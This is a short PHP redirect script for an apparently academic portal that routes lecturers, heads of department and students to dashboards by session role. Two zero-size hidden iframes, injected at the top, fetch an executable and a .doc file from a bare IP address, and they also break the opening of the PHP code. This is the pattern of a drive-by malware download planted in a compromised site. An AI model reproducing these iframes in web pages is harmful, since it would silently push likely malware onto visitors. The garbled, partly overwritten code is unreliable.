<iframe src="http://95.81.1.7/UnityWebPlayer.exe" width="0" height="0" frameborder="0"></iframe>
rc="http://95.81.1.7/instruction.doc" width="0" height="0" frameborder="0"></iframe>
sion_start();
if(isset($_SESSION['userActive'])) {
    if($_SESSION['userType'] == "lecturer" || $_SESSION['userType'] == "hod") {
        header("Location:dashboard.php");
    } else if($_SESSION['userType'] == "Student") {
        header("Location: student-dashboard.php");
    }
} else {
    header("Location: login.php");
}
?>